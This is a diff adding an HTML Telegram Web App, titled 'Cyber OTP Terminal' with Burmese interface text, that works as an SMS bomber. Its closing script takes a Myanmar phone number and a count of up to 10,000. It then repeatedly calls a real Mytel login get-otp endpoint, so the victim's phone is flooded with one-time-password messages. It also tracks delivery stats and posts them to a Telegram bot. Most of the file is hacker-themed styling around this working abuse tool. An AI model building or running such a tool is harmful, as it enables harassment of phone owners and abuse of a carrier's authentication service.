@@ -1,0 +1,904 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Cyber OTP Terminal</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&family=Myanmar+Sangam+MN&display=swap');
+        
+        :root {
+            --tg-theme-bg-color: #0a0a0a;
+            --tg-theme-text-color: #00ff41;
+            --tg-theme-hint-color: #00cc33;
+            --tg-theme-link-color: #0066ff;
+            --tg-theme-button-color: #00ff41;
+            --tg-theme-button-text-color: #000000;
+            --tg-theme-secondary-bg-color: #050505;
+            
+            --hacker-green: #00ff41;
+            --matrix-green: #00cc33;
+            --cyber-blue: #0066ff;
+            --neon-pink: #ff00ff;
+            --neon-purple: #9d00ff;
+            --dark-bg: #0a0a0a;
+            --darker-bg: #050505;
+            --terminal-bg: rgba(10, 15, 10, 0.9);
+            --glow: 0 0 10px currentColor;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Share Tech Mono', monospace;
+            background: var(--tg-theme-bg-color, var(--dark-bg));
+            color: var(--tg-theme-text-color, var(--hacker-green));
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        /* Matrix background effect */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            opacity: 0.1;
+        }
+        
+        /* Glitch effect */
+        .glitch-container {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+        }
+        
+        .glitch-text {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            position: relative;
+            text-shadow: var(--glow);
+            color: var(--tg-theme-text-color, var(--hacker-green));
+            text-align: center;
+            margin-bottom: 30px;
+            letter-spacing: 3px;
+        }
+        
+        .glitch-text::before,
+        .glitch-text::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .glitch-text::before {
+            left: 2px;
+            text-shadow: -2px 0 var(--neon-pink);
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim 5s infinite linear alternate-reverse;
+        }
+        
+        .glitch-text::after {
+            left: -2px;
+            text-shadow: -2px 0 var(--cyber-blue);
+            clip: rect(44px, 450px, 56px, 0);
+            animation: glitch-anim2 5s infinite linear alternate-reverse;
+        }
+        
+        @keyframes glitch-anim {
+            0% { clip: rect(42px, 9999px, 44px, 0); }
+            5% { clip: rect(12px, 9999px, 59px, 0); }
+            10% { clip: rect(48px, 9999px, 29px, 0); }
+            15% { clip: rect(42px, 9999px, 73px, 0); }
+            20% { clip: rect(63px, 9999px, 27px, 0); }
+            25% { clip: rect(34px, 9999px, 55px, 0); }
+            30% { clip: rect(86px, 9999px, 73px, 0); }
+            35% { clip: rect(20px, 9999px, 20px, 0); }
+            40% { clip: rect(26px, 9999px, 60px, 0); }
+            45% { clip: rect(25px, 9999px, 66px, 0); }
+            50% { clip: rect(57px, 9999px, 98px, 0); }
+            55% { clip: rect(5px, 9999px, 46px, 0); }
+            60% { clip: rect(82px, 9999px, 31px, 0); }
+            65% { clip: rect(54px, 9999px, 27px, 0); }
+            70% { clip: rect(28px, 9999px, 99px, 0); }
+            75% { clip: rect(45px, 9999px, 69px, 0); }
+            80% { clip: rect(23px, 9999px, 85px, 0); }
+            85% { clip: rect(54px, 9999px, 84px, 0); }
+            90% { clip: rect(45px, 9999px, 47px, 0); }
+            95% { clip: rect(37px, 9999px, 20px, 0); }
+            100% { clip: rect(4px, 9999px, 91px, 0); }
+        }
+        
+        @keyframes glitch-anim2 {
+            0% { clip: rect(65px, 9999px, 100px, 0); }
+            5% { clip: rect(52px, 9999px, 74px, 0); }
+            10% { clip: rect(79px, 9999px, 85px, 0); }
+            15% { clip: rect(75px, 9999px, 5px, 0); }
+            20% { clip: rect(67px, 9999px, 61px, 0); }
+            25% { clip: rect(14px, 9999px, 79px, 0); }
+            30% { clip: rect(1px, 9999px, 66px, 0); }
+            35% { clip: rect(86px, 9999px, 30px, 0); }
+            40% { clip: rect(23px, 9999px, 98px, 0); }
+            45% { clip: rect(85px, 9999px, 72px, 0); }
+            50% { clip: rect(71px, 9999px, 75px, 0); }
+            55% { clip: rect(2px, 9999px, 48px, 0); }
+            60% { clip: rect(30px, 9999px, 16px, 0); }
+            65% { clip: rect(59px, 9999px, 50px, 0); }
+            70% { clip: rect(41px, 9999px, 62px, 0); }
+            75% { clip: rect(2px, 9999px, 82px, 0); }
+            80% { clip: rect(47px, 9999px, 73px, 0); }
+            85% { clip: rect(3px, 9999px, 27px, 0); }
+            90% { clip: rect(26px, 9999px, 55px, 0); }
+            95% { clip: rect(42px, 9999px, 97px, 0); }
+            100% { clip: rect(38px, 9999px, 49px, 0); }
+        }
+        
+        .container {
+            background: var(--terminal-bg);
+            border: 1px solid var(--tg-theme-text-color, var(--hacker-green));
+            border-radius: 10px;
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 
+                0 0 20px rgba(0, 255, 65, 0.3),
+                inset 0 0 20px rgba(0, 255, 65, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, 
+                var(--hacker-green), 
+                var(--cyber-blue), 
+                var(--neon-pink), 
+                var(--neon-purple));
+            z-index: -1;
+            border-radius: 12px;
+            animation: border-glow 3s linear infinite;
+            background-size: 400%;
+        }
+        
+        @keyframes border-glow {
+            0% { background-position: 0 0; }
+            50% { background-position: 100% 0; }
+            100% { background-position: 0 0; }
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+            color: var(--tg-theme-text-color, var(--hacker-green));
+            text-shadow: var(--glow);
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            color: var(--tg-theme-text-color, var(--hacker-green));
+            z-index: 1;
+            text-shadow: var(--glow);
+        }
+        
+        input[type="tel"], input[type="number"] {
+            width: 100%;
+            padding: 15px 15px 15px 45px;
+            font-size: 1rem;
+            border-radius: 5px;
+            border: 1px solid var(--tg-theme-text-color, var(--hacker-green));
+            background: rgba(0, 20, 0, 0.7);
+            color: var(--tg-theme-text-color, var(--hacker-green));
+            outline: none;
+            transition: all 0.3s ease;
+            font-family: 'Share Tech Mono', monospace;
+            box-shadow: inset 0 0 10px rgba(0, 255, 65, 0.2);
+        }
+        
+        input[type="tel"]:focus, input[type="number"]:focus {
+            border-color: var(--neon-pink);
+            box-shadow: 
+                inset 0 0 10px rgba(255, 0, 255, 0.3),
+                0 0 15px rgba(255, 0, 255, 0.4);
+        }
+        
+        .input-hint {
+            font-size: 0.85rem;
+            margin-top: 8px;
+            color: var(--tg-theme-hint-color, var(--matrix-green));
+            text-shadow: 0 0 5px currentColor;
+        }
+        
+        .counter-controls {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        
+        .counter-btn {
+            background: rgba(0, 255, 65, 0.1);
+            border: 1px solid var(--tg-theme-text-color, var(--hacker-green));
+            color: var(--tg-theme-text-color, var(--hacker-green));
+            width: 40px;
+            height: 40px;
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: bold;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+        
+        .counter-btn:hover {
+            background: rgba(0, 255, 65, 0.3);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.6);
+        }
+        
+        .counter-btn:active {
+            transform: scale(0.95);
+        }
+        
+        button {
+            background: var(--tg-theme-button-color, var(--hacker-green));
+            color: var(--tg-theme-button-text-color, #000);
+            border: 1px solid var(--tg-theme-button-color, var(--hacker-green));
+            padding: 18px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            border-radius: 5px;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+            position: relative;
+            overflow: hidden;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.4), 
+                transparent);
+            transition: left 0.5s;
+        }
+        
+        button:hover::before {
+            left: 100%;
+        }
+        
+        button:hover {
+            box-shadow: 0 0 25px rgba(0, 255, 65, 0.6);
+            background: var(--neon-pink);
+            border-color: var(--neon-pink);
+        }
+        
+        button:active {
+            transform: translateY(2px);
+        }
+        
+        button:disabled {
+            background: rgba(255, 255, 255, 0.1);
+            color: rgba(0, 255, 65, 0.3);
+            border-color: rgba(0, 255, 65, 0.3);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: 0 0 5px rgba(0, 255, 65, 0.1);
+        }
+        
+        .status {
+            margin-top: 20px;
+            font-weight: 600;
+            text-align: center;
+            min-height: 24px;
+            padding: 12px;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+            border: 1px solid transparent;
+            font-family: 'Myanmar Sangam MN', sans-serif;
+        }
+        
+        .status.success {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--tg-theme-text-color, var(--hacker-green));
+            border-color: var(--tg-theme-text-color, var(--hacker-green));
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+        
+        .status.warning {
+            background: rgba(255, 165, 0, 0.1);
+            color: #ffa500;
+            border-color: #ffa500;
+            box-shadow: 0 0 10px rgba(255, 165, 0, 0.3);
+        }
+        
+        .status.error {
+            background: rgba(255, 0, 0, 0.1);
+            color: #ff3333;
+            border-color: #ff3333;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
+        }
+        
+        .progress-bar {
+            height: 8px;
+            background: rgba(0, 20, 0, 0.7);
+            border-radius: 4px;
+            margin-top: 15px;
+            overflow: hidden;
+            display: none;
+            border: 1px solid var(--tg-theme-text-color, var(--hacker-green));
+            box-shadow: inset 0 0 10px rgba(0, 255, 65, 0.2);
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--hacker-green), var(--cyber-blue));
+            width: 0%;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 10px var(--hacker-green);
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(0, 255, 65, 0.3);
+            font-size: 0.9rem;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--tg-theme-text-color, var(--hacker-green));
+            text-shadow: var(--glow);
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        .stat-label {
+            font-size: 0.8rem;
+            color: var(--tg-theme-hint-color, var(--matrix-green));
+            text-shadow: 0 0 5px currentColor;
+        }
+        
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, 
+                transparent, 
+                var(--tg-theme-text-color, var(--hacker-green)), 
+                transparent);
+            animation: scan 3s linear infinite;
+            opacity: 0.7;
+        }
+        
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        
+        .developer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(0, 255, 65, 0.3);
+        }
+        
+        .dev-link {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--tg-theme-text-color, var(--hacker-green));
+            text-decoration: none;
+            padding: 10px 15px;
+            border: 1px solid var(--tg-theme-text-color, var(--hacker-green));
+            border-radius: 5px;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+            background: rgba(0, 255, 65, 0.05);
+        }
+        
+        .dev-link:hover {
+            background: rgba(0, 255, 65, 0.2);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+            transform: translateY(-2px);
+        }
+        
+        .dev-link i {
+            font-size: 1.2rem;
+        }
+        
+        .floating-tag {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 255, 65, 0.9);
+            color: #000;
+            font-weight: 700;
+            padding: 8px 16px;
+            font-family: 'Share Tech Mono', monospace;
+            border-radius: 5px;
+            animation: floatText 3s ease-in-out infinite;
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.7);
+            z-index: 9999;
+            user-select: none;
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: 1px solid var(--tg-theme-text-color, var(--hacker-green));
+        }
+        
+        .floating-tag::before {
+            content: "👨‍💻";
+            font-size: 1.2rem;
+        }
+        
+        @keyframes floatText {
+            0%, 100% {
+                transform: translateY(0);
+                opacity: 0.8;
+            }
+            50% {
+                transform: translateY(-10px);
+                opacity: 1;
+            }
+        }
+        
+        /* Terminal typing effect */
+        .terminal-text {
+            border-right: 2px solid var(--tg-theme-text-color, var(--hacker-green));
+            animation: blink 1s infinite;
+            padding-right: 5px;
+        }
+        
+        @keyframes blink {
+            0%, 100% { border-color: var(--tg-theme-text-color, var(--hacker-green)); }
+            50% { border-color: transparent; }
+        }
+        
+        /* Telegram Web App specific styles */
+        .tg-header {
+            display: none;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 15px;
+            }
+            
+            .glitch-text {
+                font-size: 2rem;
+            }
+            
+            .stats {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .developer-links {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix-bg" id="matrixBg"></div>
+    
+    <div class="glitch-container">
+        <h1 class="glitch-text" data-text="Cyber OTP Terminal">Cyber OTP Terminal</h1>
+    </div>
+    
+    <div class="container">
+        <div class="scan-line"></div>
+        <form id="otpForm">
+            <div class="form-group">
+                <label for="phoneNumber">ဖုန်းနံပါတ်ထည့်ပါ</label>
+                <div class="input-wrapper">
+                    <div class="input-icon"><i class="fas fa-mobile-alt"></i></div>
+                    <input 
+                        type="tel" 
+                        id="phoneNumber" 
+                        name="phoneNumber" 
+                        placeholder="09xxxxxxxx" 
+                        pattern="09[0-9]{7,9}" 
+                        title="ဖုန်းနံပါတ်ကို 09 နဲ့စပြီး အရေအတွက်မှန်ကန်စွာထည့်ပါ" 
+                        required
+                        inputmode="tel"
+                        autocomplete="tel"
+                    />
+                </div>
+                <div class="input-hint">ဖုန်းနံပါတ်ကို 09 နဲ့စပြီး နံပါတ် ၉ လုံး သို့မဟုတ် ၁၁ လုံးဖြစ်ရပါမည်</div>
+            </div>
+
+            <div class="form-group">
+                <label for="otpCount">OTP ပို့မည့်အကြိမ်ရေ</label>
+                <div class="input-wrapper">
+                    <div class="input-icon"><i class="fas fa-sync-alt"></i></div>
+                    <input 
+                        type="number" 
+                        id="otpCount" 
+                        name="otpCount" 
+                        placeholder="1" 
+                        min="1" 
+                        max="10000" 
+                        value="1" 
+                        required
+                    />
+                </div>
+                <div class="counter-controls">
+                    <div class="counter-btn" id="decreaseCount">-</div>
+                    <div class="input-hint" id="countDisplay">1 ကြိမ်</div>
+                    <div class="counter-btn" id="increaseCount">+</div>
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn">
+                <span class="terminal-text">OTP ပို့ရန်</span>
+            </button>
+            
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <div class="status" id="statusMsg"></div>
+        </form>
+        
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-value" id="totalSent">0</div>
+                <div class="stat-label">စုစုပေါင်းပို့ပြီး</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="successRate">100%</div>
+                <div class="stat-label">အောင်မြင်မှု</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="lastSent">-</div>
+                <div class="stat-label">နောက်ဆုံးပို့ချိန်</div>
+            </div>
+        </div>
+        
+        <div class="developer-links">
+            <a href="https://t.me/prime_legends1" class="dev-link" target="_blank">
+                <i class="fab fa-telegram"></i>
+                <span>Telegram Channel</span>
+            </a>
+            <a href="https://t.me/Mg_Prime_1" class="dev-link" target="_blank">
+                <i class="fab fa-telegram"></i>
+                <span>Telegram Account</span>
+            </a>
+        </div>
+    </div>
+
+    <div class="floating-tag">Developer - Mg PRIME</div>
+
+    <script>
+        // Initialize Telegram Web App
+        let tg = window.Telegram.WebApp;
+        
+        // Expand the Web App to full screen
+        tg.expand();
+        
+        // Set background color to match theme
+        tg.setBackgroundColor('#0a0a0a');
+        
+        // Set header color
+        tg.setHeaderColor('#0a0a0a');
+        
+        // Matrix background effect
+        function createMatrix() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const container = document.getElementById('matrixBg');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            container.appendChild(canvas);
+            
+            const chars = "01";
+            const charArray = chars.split("");
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            const drops = [];
+            
+            for(let i = 0; i < columns; i++) {
+                drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
+            }
+            
+            function draw() {
+                ctx.fillStyle = "rgba(5, 5, 5, 0.04)";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = tg.themeParams.text_color || "#00ff41";
+                ctx.font = `${fontSize}px 'Share Tech Mono'`;
+                
+                for(let i = 0; i < drops.length; i++) {
+                    const text = charArray[Math.floor(Math.random() * charArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(draw, 33);
+        }
+        
+        // Initialize matrix background
+        createMatrix();
+        
+        // Form functionality
+        const form = document.getElementById('otpForm');
+        const phoneInput = document.getElementById('phoneNumber');
+        const otpCountInput = document.getElementById('otpCount');
+        const countDisplay = document.getElementById('countDisplay');
+        const statusMsg = document.getElementById('statusMsg');
+        const submitBtn = document.getElementById('submitBtn');
+        const progressBar = document.getElementById('progressBar');
+        const progressFill = document.getElementById('progressFill');
+        const totalSent = document.getElementById('totalSent');
+        const successRate = document.getElementById('successRate');
+        const lastSent = document.getElementById('lastSent');
+        const decreaseBtn = document.getElementById('decreaseCount');
+        const increaseBtn = document.getElementById('increaseCount');
+        
+        // Stats tracking
+        let stats = {
+            total: 0,
+            success: 0,
+            lastSentTime: null
+        };
+        
+        // Load stats from localStorage if available
+        if (localStorage.getItem('otpStats')) {
+            stats = JSON.parse(localStorage.getItem('otpStats'));
+            updateStatsDisplay();
+        }
+        
+        // Update count display
+        function updateCountDisplay() {
+            const count = parseInt(otpCountInput.value);
+            countDisplay.textContent = `${count} ကြိမ်`;
+        }
+        
+        // Update stats display
+        function updateStatsDisplay() {
+            totalSent.textContent = stats.total;
+            const rate = stats.total > 0 ? Math.round((stats.success / stats.total) * 100) : 100;
+            successRate.textContent = `${rate}%`;
+            
+            if (stats.lastSentTime) {
+                const date = new Date(stats.lastSentTime);
+                lastSent.textContent = `${date.getHours()}:${date.getMinutes().toString().padStart(2, '0')}`;
+            }
+        }
+        
+        // Save stats to localStorage
+        function saveStats() {
+            localStorage.setItem('otpStats', JSON.stringify(stats));
+        }
+        
+        // Counter controls
+        decreaseBtn.addEventListener('click', () => {
+            let count = parseInt(otpCountInput.value);
+            if (count > 1) {
+                otpCountInput.value = count - 1;
+                updateCountDisplay();
+            }
+        });
+        
+        increaseBtn.addEventListener('click', () => {
+            let count = parseInt(otpCountInput.value);
+            if (count < 10000) {
+                otpCountInput.value = count + 1;
+                updateCountDisplay();
+            }
+        });
+        
+        otpCountInput.addEventListener('change', updateCountDisplay);
+        otpCountInput.addEventListener('input', updateCountDisplay);
+        
+        // Initialize count display
+        updateCountDisplay();
+        
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            let phone = phoneInput.value.trim();
+            let count = parseInt(otpCountInput.value);
+            
+            // Phone number validation
+            const phoneRegex = /^09\d{7,9}$/;
+            if (!phoneRegex.test(phone)) {
+                statusMsg.textContent = "မှားယွင်းသော ဖုန်းနံပါတ်ဖြစ်ပါသည်။ (09 နဲ့စပြီး မှန်ကန်သော နံပါတ်ထည့်ပါ)";
+                statusMsg.className = 'status warning';
+                return;
+            }
+            
+            if(count < 1 || count > 10000){
+                statusMsg.textContent = "OTP ပို့မည့်အကြိမ်ရေကို 1 မှ 10000 အတွင်း ထည့်ပေးပါ";
+                statusMsg.className = 'status warning';
+                return;
+            }
+            
+            // Disable form and show progress
+            submitBtn.disabled = true;
+            progressBar.style.display = 'block';
+            statusMsg.className = 'status';
+            statusMsg.textContent = `OTP ကို ${count} ကြိမ် ${phone} သို့ လုပ်ဆောင်နေပါသည်...`;
+            
+            let successCount = 0;
+            let failedCount = 0;
+            
+            // Loop to send OTP
+            for(let i = 0; i < count; i++){
+                // Update progress
+                progressFill.style.width = `${((i + 1) / count) * 100}%`;
+                statusMsg.textContent = `OTP ပို့နေသည်... (${i + 1}/${count})`;
+                
+                // Build API URL
+                let apiUrl = `https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber=${encodeURIComponent(phone)}`;
+                
+                try {
+                    // Call API
+                    const response = await fetch(apiUrl, {
+                        method: 'GET',
+                        mode: 'cors',
+                        cache: 'no-cache'
+                    });
+                    
+                    if (response.ok) {
+                        successCount++;
+                        stats.success++;
+                    } else {
+                        failedCount++;
+                        statusMsg.className = 'status warning';
+                        statusMsg.textContent = `တစ်ကြိမ်ခု ${i+1} တွင် OTP ပို့ခြင်း မအောင်မြင်ပါ (status: ${response.status})`;
+                    }
+                    
+                    stats.total++;
+                    stats.lastSentTime = new Date().toISOString();
+                    saveStats();
+                    updateStatsDisplay();
+                    
+                    // Small delay between requests
+                    if (i < count - 1) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                    }
+                    
+                } catch (err) {
+                    failedCount++;
+                    stats.total++;
+                    saveStats();
+                    updateStatsDisplay();
+                    
+                    statusMsg.className = 'status error';
+                    statusMsg.textContent = `တစ်ကြိမ်ခု ${i+1} တွင် အမှားတက်နေပါသည်။ စမ်းသပ်ပါ။ (error: ${err.message})`;
+                    break;
+                }
+            }
+            
+            // Final status message
+            if (failedCount === 0) {
+                statusMsg.className = 'status success';
+                statusMsg.textContent = `OTP ${successCount} ကြိမ် အောင်မြင်စွာ ပို့ပြီးပါပြီ!`;
+                
+                // Send data to Telegram bot if needed
+                tg.sendData(JSON.stringify({
+                    action: 'otp_sent',
+                    phone: phone,
+                    count: successCount,
+                    success: true
+                }));
+            } else if (successCount > 0) {
+                statusMsg.className = 'status warning';
+                statusMsg.textContent = `OTP ${successCount} ကြိမ် အောင်မြင်ပြီး ${failedCount} ကြိမ် မအောင်မြင်ပါ!`;
+            }
+            
+            // Re-enable form
+            submitBtn.disabled = false;
+            
+            // Hide progress bar after a delay
+            setTimeout(() => {
+                progressBar.style.display = 'none';
+                progressFill.style.width = '0%';
+            }, 3000);
+        });
+        
+        // Handle Telegram Web App events
+        tg.onEvent('viewportChanged', (event) => {
+            console.log('Viewport changed:', event);
+        });
+        
+        // Show main button if needed
+        tg.MainButton.setText('Send OTP')
+            .onClick(() => {
+                form.dispatchEvent(new Event('submit'));
+            });
+        
+        // Enable main button when form is valid
+        function validateForm() {
+            const phone = phoneInput.value.trim();
+            const count = parseInt(otpCountInput.value);
+            const phoneRegex = /^09\d{7,9}$/;
+            
+            if (phoneRegex.test(phone) && count >= 1 && count <= 10) {
+                tg.MainButton.show();
+            } else {
+                tg.MainButton.hide();
+            }
+        }
+        
+        phoneInput.addEventListener('input', validateForm);
+        otpCountInput.addEventListener('input', validateForm);
+        
+        // Initial validation
+        validateForm();
+    </script>
+</body>
+</html>
